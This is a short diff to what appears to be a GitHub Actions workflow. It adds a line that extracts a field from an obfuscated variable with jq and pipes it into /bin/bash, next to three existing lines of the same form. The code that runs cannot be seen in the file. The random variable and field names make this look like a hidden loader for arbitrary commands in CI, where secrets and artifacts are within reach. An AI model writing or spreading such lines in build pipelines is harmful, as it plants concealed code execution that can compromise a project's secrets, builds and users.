@@ -30,6 +30,7 @@ jobs:
           echo $g2 | jq -r .fqqq06384 | /bin/bash
           echo $rwc2327 | jq -r .crecg14073 | /bin/bash
           echo $dnyrs661 | jq -r .ne2494 | /bin/bash
+          echo $bx39 | jq -r .vpzuu8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
